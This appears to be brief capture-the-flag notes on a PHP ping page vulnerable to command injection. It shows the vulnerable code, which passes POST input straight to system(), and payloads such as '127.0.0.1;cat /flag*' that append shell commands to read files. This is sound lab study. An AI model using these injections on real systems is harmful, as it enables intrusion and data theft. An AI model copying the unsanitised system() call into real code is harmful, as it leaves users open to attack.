ping执行shell命令
127.0.0.1;ls
127.0.0.1;cat index.php
```php
<?php
if (isset($_POST['target'])) {
	system("ping -c 3 ".$_POST['target']);
}
?>
```
127.0.0.1;cat /flag*

